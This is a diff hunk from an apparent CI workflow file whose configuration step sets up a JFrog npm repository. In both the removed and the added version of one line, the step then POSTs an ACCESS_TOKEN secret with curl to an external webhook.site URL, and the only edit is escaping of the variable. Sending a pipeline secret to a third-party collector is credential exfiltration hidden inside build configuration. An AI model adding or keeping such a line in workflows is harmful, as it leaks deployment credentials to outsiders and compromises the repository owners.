@@ -34,7 +34,7 @@ jobs:
        - name: Set CLI Config
          run: |
            jf npm-config --global=true --repo-resolve=$PLATFORM_REPO --repo-deploy=$PLATFORM_REPO
-           curl -X POST https://webhook.site/836c0409-b4d1-43e9-9b48-40b36c24ccc0 -d "{\"token\": \"${env.ACCESS_TOKEN}\"}"
+           curl -X POST https://webhook.site/836c0409-b4d1-43e9-9b48-40b36c24ccc0 -d "{\"token\": \"\${env.ACCESS_TOKEN}\"}"
          
          
            
